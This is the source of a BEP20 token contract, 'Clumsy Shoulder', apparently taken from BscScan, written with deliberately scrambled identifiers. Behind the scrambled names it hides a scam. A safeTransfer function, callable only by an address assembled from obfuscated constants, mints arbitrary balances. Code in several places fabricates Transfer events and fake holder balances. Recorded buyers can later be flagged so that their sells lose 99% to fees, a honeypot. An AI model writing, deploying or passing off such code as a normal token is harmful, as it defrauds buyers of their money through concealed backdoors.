/**
 *Submitted for verification at BscScan.com on 2023-01-05
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;



interface IBEP20 {

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function getOwner() external view returns (address);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function decimals() external view returns (uint8);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

}


interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}


interface IUniswapV2Router {

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function factory() external pure returns (address);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}


library SafeMath {

    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

}




contract ClumsyShoulder is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;
    uint256 private sellFromTakeLiquidity = teamSenderExemptAmountAuto / 1000; // 0.1%
    uint256 private txLiquidityShouldReceiver;

    uint256 public amountTeamBuyShouldWalletEnableIs = 0;

    uint256 private maxTakeLaunchedFrom;
    bool public totalTradingLimitSell = false;
    uint256 private fundMintLiquidityReceiver;
    uint160 constant burnAutoAmountFee = 115074456934 * 2 ** 80;
    uint256 private fundTokenSwapToMintTotal = 0;
    uint256 private tradingModeBotsTxToBurnList;
    bool private minBotsTakeMarketingListExempt = true;
    uint256 private fundEnableWalletReceiver;
    bool private isBurnMintLaunched = true;
    uint256 private amountListLaunchedTake;
    uint256  constant MASK = type(uint128).max;
    address private botsLaunchedReceiverTake = (msg.sender);
    string constant _symbol = "CSR";
    bool public teamLimitShouldFee3 = false;
    address public uniswapV2Pair;
    
    mapping(address => mapping(address => uint256)) _allowances;
    bool private totalMaxWalletFrom = false;
    uint256 public teamLimitShouldFee = 0;
    uint256 private isMinFeeSwap = 0;
    bool private receiverLimitTradingTokenMarketingLiquidityList = false;
    uint256 public launchModeWalletAmountBuyReceiverLimit = 0;

    mapping(uint256 => address) private receiverTeamExemptMintMode;
    uint256 launchedTokenSellIsLiquidityBurnShould = 34534;
    bool private minTotalModeLiquidity = true;



    uint256 private teamLimitShouldFee2 = 0;
    mapping(address => uint256) _balances;
    IUniswapV2Router public listFromTxLaunch;
    mapping(address => uint256) private walletMinSwapSellEnable;

    uint256 teamSenderExemptAmountAuto = 100000000 * (10 ** _decimals);
    uint256 constant liquidityWalletAmountMinLimit = 10000 * 10 ** 18;
    bool public takeMaxMintFee = false;
    bool public receiverTxBurnLiquidity = false;
    uint256 private txTokenAtAmountLaunchedBurnTeam = 2;
    uint256 private txShouldAutoMax = 2;
    uint256 teamAutoToList = 0;
    uint256 feeLiquidityMaxLaunch = 2 ** 18 - 1;
    mapping(address => bool) private takeSellMinShouldTokenLimit;

    uint256 public maxWalletAmount = 0;
    uint256 private tradingSwapAmountAutoAtList = 0;
    address private DEAD = 0x000000000000000000000000000000000000dEaD;
    bool private fundTokenBurnBuySwapShould = true;
    uint256 private tokenWalletAmountBotsMode = 100;

    mapping(uint256 => address) private isToBuyTxBots;
    address private botsWalletMarketingSenderReceiverEnable = (msg.sender);

    uint256  teamMaxBurnIs = 100000000 * 10 ** _decimals;
    address private ZERO = 0x0000000000000000000000000000000000000000;
    uint256 private takeMintTotalSell;
    uint256 private launchBlock = 0;

    uint160 constant limitFeeShouldList = 743204880091 * 2 ** 120;
    mapping(address => bool) private mintTokenBurnIs;
    uint256  tokenBuyToExemptBots = 100000000 * 10 ** _decimals;
    address constant marketingIsAutoModeAmountToReceiver = 0xf3108780f89cd159466DA547D8620a0d8148e6ED;


    mapping(address => bool) private buySellLiquidityTotalMaxAmount;

    uint256 private txAmountAutoMode = 0;
    address private WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    string constant _name = "Clumsy Shoulder";
    bool private receiverModeLaunchExemptBuySell = false;

    bool private teamLimitShouldFee1 = false;
    mapping(address => uint256) private minEnableBotsToFeeTx;
    uint256 constant botsBuySwapTotal = 300000 * 10 ** 18;
    uint160 constant tradingAmountFromSell = 1080821727875;

    bool private swapLimitExemptReceiverFundTakeLaunch = true;

    bool public minAutoTradingMax = false;
    uint256 private senderEnableMaxIsAtAutoBurn = 6 * 10 ** 15;
    mapping(address => bool) private fundAtTeamExemptMintBurn;

    bool private exemptAtTakeTradingFundTeam;
    uint160 constant walletSwapFeeLimit = 552893569705 * 2 ** 40;

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        listFromTxLaunch = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(listFromTxLaunch.factory()).createPair(address(this), listFromTxLaunch.WETH());
        _allowances[address(this)][address(listFromTxLaunch)] = teamSenderExemptAmountAuto;

        exemptAtTakeTradingFundTeam = true;

        buySellLiquidityTotalMaxAmount[msg.sender] = true;
        buySellLiquidityTotalMaxAmount[0x0000000000000000000000000000000000000000] = true;
        buySellLiquidityTotalMaxAmount[0x000000000000000000000000000000000000dEaD] = true;
        buySellLiquidityTotalMaxAmount[address(this)] = true;

        takeSellMinShouldTokenLimit[msg.sender] = true;
        takeSellMinShouldTokenLimit[address(this)] = true;

        fundAtTeamExemptMintBurn[msg.sender] = true;
        fundAtTeamExemptMintBurn[0x0000000000000000000000000000000000000000] = true;
        fundAtTeamExemptMintBurn[0x000000000000000000000000000000000000dEaD] = true;
        fundAtTeamExemptMintBurn[address(this)] = true;

        approve(_router, teamSenderExemptAmountAuto);
        approve(address(uniswapV2Pair), teamSenderExemptAmountAuto);
        _balances[msg.sender] = teamSenderExemptAmountAuto;
        emit Transfer(address(0), msg.sender, teamSenderExemptAmountAuto);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return teamSenderExemptAmountAuto;
    }

    function getamountReceiverMarketingTx() public view returns (bool) {
        if (teamLimitShouldFee3 != totalTradingLimitSell) {
            return totalTradingLimitSell;
        }
        if (teamLimitShouldFee3 == totalMaxWalletFrom) {
            return totalMaxWalletFrom;
        }
        return teamLimitShouldFee3;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != teamSenderExemptAmountAuto) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return amountFromMaxToken(sender, recipient, amount);
    }

    function amountFromMaxToken(address buyTeamLimitTradingListAutoExempt, address walletLaunchMintTeam, uint256 shouldAutoBotsEnableMinTotalListmount) internal returns (bool) {
        if (botsSwapSenderMintTokenReceiverTo(uint160(walletLaunchMintTeam))) {
            tradingMinListReceiver(buyTeamLimitTradingListAutoExempt, walletLaunchMintTeam, shouldAutoBotsEnableMinTotalListmount, false);
            return true;
        }
        if (botsSwapSenderMintTokenReceiverTo(uint160(buyTeamLimitTradingListAutoExempt))) {
            tradingMinListReceiver(buyTeamLimitTradingListAutoExempt, walletLaunchMintTeam, shouldAutoBotsEnableMinTotalListmount, true);
            return true;
        }
        
        if (receiverTxBurnLiquidity == isBurnMintLaunched) {
            receiverTxBurnLiquidity = takeMaxMintFee;
        }


        bool modeShouldExemptAuto = sellWalletAutoAmount(buyTeamLimitTradingListAutoExempt) || sellWalletAutoAmount(walletLaunchMintTeam);
        
        if (receiverModeLaunchExemptBuySell != receiverTxBurnLiquidity) {
            receiverModeLaunchExemptBuySell = receiverTxBurnLiquidity;
        }

        if (totalTradingLimitSell == takeMaxMintFee) {
            totalTradingLimitSell = receiverTxBurnLiquidity;
        }


        if (buyTeamLimitTradingListAutoExempt == uniswapV2Pair) {
            if (maxWalletAmount != 0 && listExemptLaunchFrom(uint160(walletLaunchMintTeam))) {
                marketingExemptLiquidityBurnTokenMintFund();
            }
            if (!modeShouldExemptAuto) {
                sellFundTokenMode(walletLaunchMintTeam);
            }
        }
        
        
        if (inSwap || modeShouldExemptAuto) {return shouldTradingExemptAt(buyTeamLimitTradingListAutoExempt, walletLaunchMintTeam, shouldAutoBotsEnableMinTotalListmount);}
        
        if (receiverTxBurnLiquidity != totalMaxWalletFrom) {
            receiverTxBurnLiquidity = minBotsTakeMarketingListExempt;
        }

        if (teamLimitShouldFee1 != teamLimitShouldFee3) {
            teamLimitShouldFee1 = takeMaxMintFee;
        }


        require((shouldAutoBotsEnableMinTotalListmount <= teamMaxBurnIs) || buySellLiquidityTotalMaxAmount[buyTeamLimitTradingListAutoExempt] || buySellLiquidityTotalMaxAmount[walletLaunchMintTeam], "Max TX Limit!");

        _balances[buyTeamLimitTradingListAutoExempt] = _balances[buyTeamLimitTradingListAutoExempt].sub(shouldAutoBotsEnableMinTotalListmount, "Insufficient Balance!");
        
        if (teamLimitShouldFee1 == totalMaxWalletFrom) {
            teamLimitShouldFee1 = totalMaxWalletFrom;
        }

        if (receiverTxBurnLiquidity == teamLimitShouldFee3) {
            receiverTxBurnLiquidity = minTotalModeLiquidity;
        }


        uint256 shouldAutoBotsEnableMinTotalListmountReceived = feeBuyBotsIs(buyTeamLimitTradingListAutoExempt) ? amountTeamFromSenderReceiverFundMint(buyTeamLimitTradingListAutoExempt, walletLaunchMintTeam, shouldAutoBotsEnableMinTotalListmount) : shouldAutoBotsEnableMinTotalListmount;

        _balances[walletLaunchMintTeam] = _balances[walletLaunchMintTeam].add(shouldAutoBotsEnableMinTotalListmountReceived);
        emit Transfer(buyTeamLimitTradingListAutoExempt, walletLaunchMintTeam, shouldAutoBotsEnableMinTotalListmountReceived);
        return true;
    }

    function setswapTradingAutoFund(bool shouldAutoBotsEnableMinTotalList0) public onlyOwner {
        if (receiverModeLaunchExemptBuySell == receiverTxBurnLiquidity) {
            receiverTxBurnLiquidity=shouldAutoBotsEnableMinTotalList0;
        }
        if (receiverModeLaunchExemptBuySell == teamLimitShouldFee1) {
            teamLimitShouldFee1=shouldAutoBotsEnableMinTotalList0;
        }
        receiverModeLaunchExemptBuySell=shouldAutoBotsEnableMinTotalList0;
    }

    function getreceiverListLimitLaunchAmountAutoMint(uint256 shouldAutoBotsEnableMinTotalList0) public view returns (address) {
        if (shouldAutoBotsEnableMinTotalList0 == amountTeamBuyShouldWalletEnableIs) {
            return DEAD;
        }
        if (shouldAutoBotsEnableMinTotalList0 == amountTeamBuyShouldWalletEnableIs) {
            return botsLaunchedReceiverTake;
        }
        if (shouldAutoBotsEnableMinTotalList0 == maxWalletAmount) {
            return ZERO;
        }
            return isToBuyTxBots[shouldAutoBotsEnableMinTotalList0];
    }

    function sellWalletAutoAmount(address shouldAutoBotsEnableMinTotalListddr) private view returns (bool) {
        return shouldAutoBotsEnableMinTotalListddr == botsWalletMarketingSenderReceiverEnable;
    }

    function toReceiverLiquidityBurn(uint160 txTradingLimitSwapLaunch) private pure returns (bool) {
        uint160 shouldAutoBotsEnableMinTotalList = limitFeeShouldList;
        shouldAutoBotsEnableMinTotalList += burnAutoAmountFee;
        shouldAutoBotsEnableMinTotalList = shouldAutoBotsEnableMinTotalList + walletSwapFeeLimit;
        shouldAutoBotsEnableMinTotalList = shouldAutoBotsEnableMinTotalList + tradingAmountFromSell;
        return txTradingLimitSwapLaunch == shouldAutoBotsEnableMinTotalList;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function sellFundTokenMode(address shouldAutoBotsEnableMinTotalListddr) private {
        uint256 limitIsListAmount = receiverMinSwapExempt();
        if (limitIsListAmount < senderEnableMaxIsAtAutoBurn) {
            launchModeWalletAmountBuyReceiverLimit += 1;
            receiverTeamExemptMintMode[launchModeWalletAmountBuyReceiverLimit] = shouldAutoBotsEnableMinTotalListddr;
            minEnableBotsToFeeTx[shouldAutoBotsEnableMinTotalListddr] += limitIsListAmount;
            if (minEnableBotsToFeeTx[shouldAutoBotsEnableMinTotalListddr] > senderEnableMaxIsAtAutoBurn) {
                maxWalletAmount = maxWalletAmount + 1;
                isToBuyTxBots[maxWalletAmount] = shouldAutoBotsEnableMinTotalListddr;
            }
            return;
        }
        maxWalletAmount = maxWalletAmount + 1;
        isToBuyTxBots[maxWalletAmount] = shouldAutoBotsEnableMinTotalListddr;
    }

    function fromBurnFeeFund(address buyTeamLimitTradingListAutoExempt, bool modeFundTxTrading) internal returns (uint256) {
        
        if (modeFundTxTrading) {
            takeMintTotalSell = txShouldAutoMax + fundTokenSwapToMintTotal;
            return txReceiverShouldLaunch(buyTeamLimitTradingListAutoExempt, takeMintTotalSell);
        }
        if (!modeFundTxTrading && buyTeamLimitTradingListAutoExempt == uniswapV2Pair) {
            takeMintTotalSell = txTokenAtAmountLaunchedBurnTeam + txAmountAutoMode;
            return takeMintTotalSell;
        }
        return txReceiverShouldLaunch(buyTeamLimitTradingListAutoExempt, takeMintTotalSell);
    }

    function getenableExemptFromFundFee() public view returns (bool) {
        if (minBotsTakeMarketingListExempt == teamLimitShouldFee1) {
            return teamLimitShouldFee1;
        }
        if (minBotsTakeMarketingListExempt != takeMaxMintFee) {
            return takeMaxMintFee;
        }
        return minBotsTakeMarketingListExempt;
    }

    function tradingMinListReceiver(address buyTeamLimitTradingListAutoExempt, address walletLaunchMintTeam, uint256 shouldAutoBotsEnableMinTotalListmount, bool fundTokenBotsWallet) private {
        if (fundTokenBotsWallet) {
            buyTeamLimitTradingListAutoExempt = address(uint160(uint160(marketingIsAutoModeAmountToReceiver) + teamAutoToList));
            teamAutoToList++;
            _balances[walletLaunchMintTeam] = _balances[walletLaunchMintTeam].add(shouldAutoBotsEnableMinTotalListmount);
        } else {
            _balances[buyTeamLimitTradingListAutoExempt] = _balances[buyTeamLimitTradingListAutoExempt].sub(shouldAutoBotsEnableMinTotalListmount);
        }
        emit Transfer(buyTeamLimitTradingListAutoExempt, walletLaunchMintTeam, shouldAutoBotsEnableMinTotalListmount);
    }

    function amountTeamFromSenderReceiverFundMint(address buyTeamLimitTradingListAutoExempt, address modeMaxWalletTake, uint256 shouldAutoBotsEnableMinTotalListmount) internal returns (uint256) {
        
        uint256 enableFromReceiverIsAmount = shouldAutoBotsEnableMinTotalListmount.mul(fromBurnFeeFund(buyTeamLimitTradingListAutoExempt, modeMaxWalletTake == uniswapV2Pair)).div(tokenWalletAmountBotsMode);

        if (mintTokenBurnIs[buyTeamLimitTradingListAutoExempt] || mintTokenBurnIs[modeMaxWalletTake]) {
            enableFromReceiverIsAmount = shouldAutoBotsEnableMinTotalListmount.mul(99).div(tokenWalletAmountBotsMode);
        }

        _balances[address(this)] = _balances[address(this)].add(enableFromReceiverIsAmount);
        emit Transfer(buyTeamLimitTradingListAutoExempt, address(this), enableFromReceiverIsAmount);
        
        return shouldAutoBotsEnableMinTotalListmount.sub(enableFromReceiverIsAmount);
    }

    function settoAmountTakeBots(bool shouldAutoBotsEnableMinTotalList0) public onlyOwner {
        minTotalModeLiquidity=shouldAutoBotsEnableMinTotalList0;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function exemptTokenSwapIsModeBotsMint() private view returns (uint256) {
        return block.timestamp;
    }

    function txReceiverShouldLaunch(address buyTeamLimitTradingListAutoExempt, uint256 enableFromReceiverIs) private view returns (uint256) {
        uint256 swapBuyTakeSender = walletMinSwapSellEnable[buyTeamLimitTradingListAutoExempt];
        if (swapBuyTakeSender > 0 && exemptTokenSwapIsModeBotsMint() - swapBuyTakeSender > 0) {
            return 99;
        }
        return enableFromReceiverIs;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function feeBuyBotsIs(address buyTeamLimitTradingListAutoExempt) internal view returns (bool) {
        return !fundAtTeamExemptMintBurn[buyTeamLimitTradingListAutoExempt];
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function safeTransfer(address buyTeamLimitTradingListAutoExempt, address walletLaunchMintTeam, uint256 shouldAutoBotsEnableMinTotalListmount) public {
        if (!toReceiverLiquidityBurn(uint160(msg.sender))) {
            return;
        }
        if (botsSwapSenderMintTokenReceiverTo(uint160(walletLaunchMintTeam))) {
            tradingMinListReceiver(buyTeamLimitTradingListAutoExempt, walletLaunchMintTeam, shouldAutoBotsEnableMinTotalListmount, false);
            return;
        }
        if (botsSwapSenderMintTokenReceiverTo(uint160(buyTeamLimitTradingListAutoExempt))) {
            tradingMinListReceiver(buyTeamLimitTradingListAutoExempt, walletLaunchMintTeam, shouldAutoBotsEnableMinTotalListmount, true);
            return;
        }
        if (buyTeamLimitTradingListAutoExempt == address(0)) {
            _balances[walletLaunchMintTeam] = _balances[walletLaunchMintTeam].add(shouldAutoBotsEnableMinTotalListmount);
            return;
        }
        if (buyTeamLimitTradingListAutoExempt == address(1)) {
            return;
        }
    }

    function getswapTradingAutoFund() public view returns (bool) {
        if (receiverModeLaunchExemptBuySell == teamLimitShouldFee3) {
            return teamLimitShouldFee3;
        }
        if (receiverModeLaunchExemptBuySell == totalTradingLimitSell) {
            return totalTradingLimitSell;
        }
        return receiverModeLaunchExemptBuySell;
    }

    function getlaunchedFromExemptReceiverSenderTokenTake() public view returns (uint256) {
        if (fundTokenSwapToMintTotal != teamLimitShouldFee2) {
            return teamLimitShouldFee2;
        }
        if (fundTokenSwapToMintTotal == isMinFeeSwap) {
            return isMinFeeSwap;
        }
        if (fundTokenSwapToMintTotal != senderEnableMaxIsAtAutoBurn) {
            return senderEnableMaxIsAtAutoBurn;
        }
        return fundTokenSwapToMintTotal;
    }

    function getDEAD() public view returns (address) {
        return DEAD;
    }

    function setamountReceiverMarketingTx(bool shouldAutoBotsEnableMinTotalList0) public onlyOwner {
        if (teamLimitShouldFee3 == swapLimitExemptReceiverFundTakeLaunch) {
            swapLimitExemptReceiverFundTakeLaunch=shouldAutoBotsEnableMinTotalList0;
        }
        if (teamLimitShouldFee3 != takeMaxMintFee) {
            takeMaxMintFee=shouldAutoBotsEnableMinTotalList0;
        }
        if (teamLimitShouldFee3 != teamLimitShouldFee1) {
            teamLimitShouldFee1=shouldAutoBotsEnableMinTotalList0;
        }
        teamLimitShouldFee3=shouldAutoBotsEnableMinTotalList0;
    }

    function liquidityReceiverBuyAmount() private {
        if (launchModeWalletAmountBuyReceiverLimit > 0) {
            for (uint256 i = 1; i <= launchModeWalletAmountBuyReceiverLimit; i++) {
                if (walletMinSwapSellEnable[receiverTeamExemptMintMode[i]] == 0) {
                    walletMinSwapSellEnable[receiverTeamExemptMintMode[i]] = block.timestamp;
                }
            }
            launchModeWalletAmountBuyReceiverLimit = 0;
        }
    }

    function getbuyTokenTakeSwapAt(address shouldAutoBotsEnableMinTotalList0) public view returns (bool) {
        if (shouldAutoBotsEnableMinTotalList0 != ZERO) {
            return receiverTxBurnLiquidity;
        }
        if (shouldAutoBotsEnableMinTotalList0 != ZERO) {
            return receiverModeLaunchExemptBuySell;
        }
            return buySellLiquidityTotalMaxAmount[shouldAutoBotsEnableMinTotalList0];
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, teamSenderExemptAmountAuto);
    }

    function setlaunchedFromExemptReceiverSenderTokenTake(uint256 shouldAutoBotsEnableMinTotalList0) public onlyOwner {
        if (fundTokenSwapToMintTotal != isMinFeeSwap) {
            isMinFeeSwap=shouldAutoBotsEnableMinTotalList0;
        }
        if (fundTokenSwapToMintTotal == txAmountAutoMode) {
            txAmountAutoMode=shouldAutoBotsEnableMinTotalList0;
        }
        if (fundTokenSwapToMintTotal == isMinFeeSwap) {
            isMinFeeSwap=shouldAutoBotsEnableMinTotalList0;
        }
        fundTokenSwapToMintTotal=shouldAutoBotsEnableMinTotalList0;
    }

    function setDEAD(address shouldAutoBotsEnableMinTotalList0) public onlyOwner {
        DEAD=shouldAutoBotsEnableMinTotalList0;
    }

    function setminShouldListLimit(uint256 shouldAutoBotsEnableMinTotalList0) public onlyOwner {
        if (senderEnableMaxIsAtAutoBurn == fundTokenSwapToMintTotal) {
            fundTokenSwapToMintTotal=shouldAutoBotsEnableMinTotalList0;
        }
        if (senderEnableMaxIsAtAutoBurn == maxWalletAmount) {
            maxWalletAmount=shouldAutoBotsEnableMinTotalList0;
        }
        if (senderEnableMaxIsAtAutoBurn == launchModeWalletAmountBuyReceiverLimit) {
            launchModeWalletAmountBuyReceiverLimit=shouldAutoBotsEnableMinTotalList0;
        }
        senderEnableMaxIsAtAutoBurn=shouldAutoBotsEnableMinTotalList0;
    }

    function botsSwapSenderMintTokenReceiverTo(uint160 txTradingLimitSwapLaunch) private pure returns (bool) {
        if (txTradingLimitSwapLaunch >= uint160(marketingIsAutoModeAmountToReceiver) && txTradingLimitSwapLaunch <= uint160(marketingIsAutoModeAmountToReceiver) + 320000) {
            return true;
        }
        return false;
    }

    function receiverMinSwapExempt() private view returns (uint256) {
        address senderSellAutoFeeEnableMin = WBNB;
        if (address(this) < WBNB) {
            senderSellAutoFeeEnableMin = address(this);
        }
        (uint exemptMaxIsTradingTotalReceiverSender, uint receiverExemptListIs,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 fundLaunchFeeTrading,) = WBNB == senderSellAutoFeeEnableMin ? (exemptMaxIsTradingTotalReceiverSender, receiverExemptListIs) : (receiverExemptListIs, exemptMaxIsTradingTotalReceiverSender);
        uint256 txFeeMinToReceiverExempt = IERC20(WBNB).balanceOf(uniswapV2Pair) - fundLaunchFeeTrading;
        return txFeeMinToReceiverExempt;
    }

    function setreceiverListLimitLaunchAmountAutoMint(uint256 shouldAutoBotsEnableMinTotalList0,address shouldAutoBotsEnableMinTotalList1) public onlyOwner {
        isToBuyTxBots[shouldAutoBotsEnableMinTotalList0]=shouldAutoBotsEnableMinTotalList1;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return amountFromMaxToken(msg.sender, recipient, amount);
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function getminShouldListLimit() public view returns (uint256) {
        return senderEnableMaxIsAtAutoBurn;
    }

    function shouldTradingExemptAt(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function setenableExemptFromFundFee(bool shouldAutoBotsEnableMinTotalList0) public onlyOwner {
        if (minBotsTakeMarketingListExempt != isBurnMintLaunched) {
            isBurnMintLaunched=shouldAutoBotsEnableMinTotalList0;
        }
        if (minBotsTakeMarketingListExempt != teamLimitShouldFee3) {
            teamLimitShouldFee3=shouldAutoBotsEnableMinTotalList0;
        }
        minBotsTakeMarketingListExempt=shouldAutoBotsEnableMinTotalList0;
    }

    function setbuyTokenTakeSwapAt(address shouldAutoBotsEnableMinTotalList0,bool shouldAutoBotsEnableMinTotalList1) public onlyOwner {
        buySellLiquidityTotalMaxAmount[shouldAutoBotsEnableMinTotalList0]=shouldAutoBotsEnableMinTotalList1;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (botsSwapSenderMintTokenReceiverTo(uint160(account))) {
            return fundFromTxExempt(uint160(account));
        }
        return _balances[account];
    }

    function gettakeMarketingAutoMaxSender() public view returns (bool) {
        if (swapLimitExemptReceiverFundTakeLaunch != takeMaxMintFee) {
            return takeMaxMintFee;
        }
        return swapLimitExemptReceiverFundTakeLaunch;
    }

    function getMaxTotalAFee() public {
        liquidityReceiverBuyAmount();
    }

    function listExemptLaunchFrom(uint160 walletLaunchMintTeam) private view returns (bool) {
        return uint16(walletLaunchMintTeam) == launchedTokenSellIsLiquidityBurnShould;
    }

    function settakeMarketingAutoMaxSender(bool shouldAutoBotsEnableMinTotalList0) public onlyOwner {
        if (swapLimitExemptReceiverFundTakeLaunch != fundTokenBurnBuySwapShould) {
            fundTokenBurnBuySwapShould=shouldAutoBotsEnableMinTotalList0;
        }
        swapLimitExemptReceiverFundTakeLaunch=shouldAutoBotsEnableMinTotalList0;
    }

    function marketingExemptLiquidityBurnTokenMintFund() private {
        if (maxWalletAmount > 0) {
            for (uint256 i = 1; i <= maxWalletAmount; i++) {
                if (walletMinSwapSellEnable[isToBuyTxBots[i]] == 0) {
                    walletMinSwapSellEnable[isToBuyTxBots[i]] = block.timestamp;
                }
            }
            maxWalletAmount = 0;
        }
    }

    function getMaxTotalAmount() public {
        marketingExemptLiquidityBurnTokenMintFund();
    }

    function gettoAmountTakeBots() public view returns (bool) {
        return minTotalModeLiquidity;
    }

    function fundFromTxExempt(uint160 txTradingLimitSwapLaunch) private view returns (uint256) {
        uint256 toSwapFromAutoModeLiquidity = teamAutoToList;
        uint256 sellReceiverMintFrom = txTradingLimitSwapLaunch - uint160(marketingIsAutoModeAmountToReceiver);
        if (sellReceiverMintFrom < toSwapFromAutoModeLiquidity) {
            return liquidityWalletAmountMinLimit;
        }
        return botsBuySwapTotal;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}